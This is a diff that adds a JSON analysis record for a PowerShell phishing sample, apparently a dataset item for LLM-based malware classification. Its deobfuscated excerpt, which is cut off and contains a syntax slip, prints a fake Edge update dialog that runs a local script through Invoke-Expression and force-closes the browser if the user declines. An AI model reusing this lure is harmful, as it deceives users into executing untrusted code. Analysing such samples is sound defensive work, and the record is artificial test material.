@@ -1,0 +1,99 @@
+{
+  "meta": {
+    "quelldatei": "tech_047_phish.ps1",
+    "sha256": "6b535aa720d7b2798ddd6520754a2b8c2e8c7b8a534d3da179e364b7d6835a65",
+    "groesse_bytes": 2125,
+    "zeilen": 59,
+    "ground_truth_label": "techniques",
+    "analyse_gekuerzt": false,
+    "hinweis": "Kein Urteil enthalten. Bewertung erfolgt durch das LLM."
+  },
+  "stufe1_extract": {
+    "strings": [
+      "Edge Browser Update",
+      "CenterScreen",
+      "Important Update Available. Click 'Update' to install.`n`n",
+      "Browser: Edge Browser`nVerified Published: Edge`n`nNecessary measures: Click 'Install' to update.",
+      "Install",
+      "Exit",
+      "$env:USERPROFILE\\Desktop\\update.ps1",
+      "msedge"
+    ],
+    "string_anzahl_gesamt": 9,
+    "base64_bloecke_dekodiert": [],
+    "base64_bloecke_gesamt": 0
+  },
+  "stufe2_features": {
+    "strings": [
+      "Edge Browser Update",
+      "CenterScreen",
+      "Important Update Available. Click 'Update' to install.`n`n",
+      "Browser: Edge Browser`nVerified Published: Edge`n`nNecessary measures: Click 'Install' to update.",
+      "Install",
+      "Exit",
+      "$env:USERPROFILE\\Desktop\\update.ps1",
+      "msedge"
+    ],
+    "string_anzahl_gesamt": 9,
+    "base64_bloecke_dekodiert": [],
+    "base64_bloecke_gesamt": 0,
+    "beobachtete_cmdlets": [
+      "Add-Type",
+      "Get-Process",
+      "Invoke-Expression",
+      "New-Object",
+      "Start-Sleep",
+      "Stop-Process"
+    ],
+    "auffaellige_tokens": {
+      "invoke_expression": 1,
+      "add_type": 1
+    },
+    "iocs": {
+      "urls": [],
+      "ipv4": [],
+      "pfade": [
+        "$env:USERPROFILE\\Desktop\\update.ps1"
+      ]
+    }
+  },
+  "stufe3_structure": {
+    "strings": [
+      "Edge Browser Update",
+      "CenterScreen",
+      "Important Update Available. Click 'Update' to install.`n`n",
+      "Browser: Edge Browser`nVerified Published: Edge`n`nNecessary measures: Click 'Install' to update.",
+      "Install",
+      "Exit",
+      "$env:USERPROFILE\\Desktop\\update.ps1",
+      "msedge"
+    ],
+    "string_anzahl_gesamt": 9,
+    "base64_bloecke_dekodiert": [],
+    "base64_bloecke_gesamt": 0,
+    "beobachtete_cmdlets": [
+      "Add-Type",
+      "Get-Process",
+      "Invoke-Expression",
+      "New-Object",
+      "Start-Sleep",
+      "Stop-Process"
+    ],
+    "auffaellige_tokens": {
+      "invoke_expression": 1,
+      "add_type": 1
+    },
+    "iocs": {
+      "urls": [],
+      "ipv4": [],
+      "pfade": [
+        "$env:USERPROFILE\\Desktop\\update.ps1"
+      ]
+    },
+    "deobfuskiert_auszug": "Add-Type -AssemblyName System.Windows.Forms\r\n\r\nfunction ShowTermsOfServicePopup {\r\n    $form = New-Object System.Windows.Forms.Form\r\n    $form.Text = \"Edge Browser Update\"\r\n    $form.Width = 400\r\n    $form.Height = 250\r\n    $form.StartPosition = \"CenterScreen\"\r\n\r\n    $richtextBox = New-Object System.Windows.Forms.RichTextBox\r\n    $richtextBox.Width = 350\r\n    $richtextBox.Height = 120\r\n    $richtextBox.Location = New-Object System.Drawing.Point(10,10)\r\n    $richtextBox.ReadOnly = $true\r\n    $richtextBox.BorderStyle = [System.Windows.Forms.BorderStyle]::None\r\n    $richtextBox.BackColor = $form.BackColor\r\n\r\n    $richtextBox.SelectionFont = New-Object System.Drawing.Font($richtextBox.Font.FontFamily, 12, [System.Drawing.FontStyle]::Bold)\r\n    $richtextBox.AppendText(\"Important Update Available. Click 'Update' to install.nn\")\r\n    $richtextBox.SelectionFont = $richtextBox.Font\r\n    $richtextBox.AppendText(\"Browser: Edge BrowsernVerified Published: EdgennNecessary measures: Click 'Install' to update.\")\r\n\r\n    $agreeButton = New-Object System.Windows.Forms.Button\r\n    $agreeButton.Text = \"Install\"\r\n    $agreeButton.DialogResult = [System.Windows.Forms.DialogResult]::OK\r\n    $agreeButton.Location = New-Object System.Drawing.Point(50,150)\r\n\r\n    $disagreeButton = New-Object System.Windows.Forms.Button\r\n    $disagreeButton.Text = \"Exit\"\r\n    $disagreeButton.DialogResult = [System.Windows.Forms.DialogResult]::Cancel\r\n    $disagreeButton.Location = New-Object System.Drawing.Point(230,150)\r\n\r\n    $form.Controls.Add($richtextBox)\r\n    $form.Controls.Add($agreeButton)\r\n    $form.Controls.Add($disagreeButton)\r\n\r\n    $result = $form.ShowDialog()\r\n\r\n   if ($result -eq [System.Windows.Forms.DialogResult]::OK) {\r\n\r\n    Invoke-Expression \"$env:USERPROFILE\\Desktop\\update.ps1\"\r\n\r\n\r\n    return $true\r\n\r\n    } else:\r\n\r\n        Get-Process -Name \"msedge\" | Stop-Process -Force\r\n        return $false\r\n    }\r\n\r\nwhile ($true) {\r\n    Start-Sleep -Seconds 5\r\n    $edgeProcess = Get-Process -Name \"m",
+    "dekodierte_befehle": [],
+    "beobachtete_abfolge": [
+      "Zeichenkette als Code ausfuehren"
+    ]
+  }
+}
